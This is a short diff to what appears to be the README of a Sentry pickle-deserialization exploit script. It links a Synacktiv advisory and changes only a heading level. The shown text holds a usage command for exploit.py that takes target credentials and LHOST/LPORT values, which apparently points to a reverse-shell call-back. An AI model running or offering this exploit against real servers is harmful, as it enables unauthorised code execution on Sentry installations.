@@ -7,7 +7,7 @@
 <h4> Advisory Link : https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf </h4>
 <h4> Exploit DB Link :  </h4>
 
-<h3> Usage : python exploit.py --url `http://puturhostnamehere/auth/login/sentry/` -U `username` -P `password` -l `LHOST` -p `LPORT`</h3>
+<h4> Usage : python exploit.py --url `http://puturhostnamehere/auth/login/sentry/` -U `username` -P `password` -l `LHOST` -p `LPORT`</h4>
   
 
 usage: exploit.py [-h] [-U U] [-P P] [-l L] [-p P] [--url URL]
